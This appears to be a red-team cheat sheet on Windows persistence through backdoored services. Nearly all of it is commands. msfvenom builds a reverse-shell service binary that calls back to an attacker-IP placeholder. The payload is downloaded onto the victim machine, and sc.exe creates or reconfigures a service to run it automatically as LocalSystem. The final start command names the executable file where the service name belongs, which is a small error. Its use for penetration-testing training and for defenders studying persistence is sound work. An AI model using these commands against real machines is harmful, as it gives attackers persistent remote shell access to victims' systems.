---
title: services
tags: [windows-security, persistence-post, type/cheatsheet, phase/persistence, platform/windows]
---

# Services

## Persistence using Backdoored Services

### Backdoor a New Service

```
# Create the service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=4444 -f exe-service -o shell.exe

# Download in the victim machine
iwr  -OutFile shell.exe

# Create a new service in the victim machine
sc.exe create MalService binPath="C:\shell.exe" start=auto

# Start the Service in victim machine
sc.exe start MalService

```

### Backdoor an Existing Service

```
# Enumerate Services in Victim machine
sc.exe query state=all

sc.exe query MalService

# View the path
sc.exe qc MalService

# Create a payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=4444 -f exe-service -o shell2.exe

# Reconfigure the service
sc.exe config MalService binPath= "C:\shell2.exe" start= auto obj= "LocalSystem"

# Start the service
sc.exe start shell2.exe

```

***

## REFERENCES

* 
* 
* 
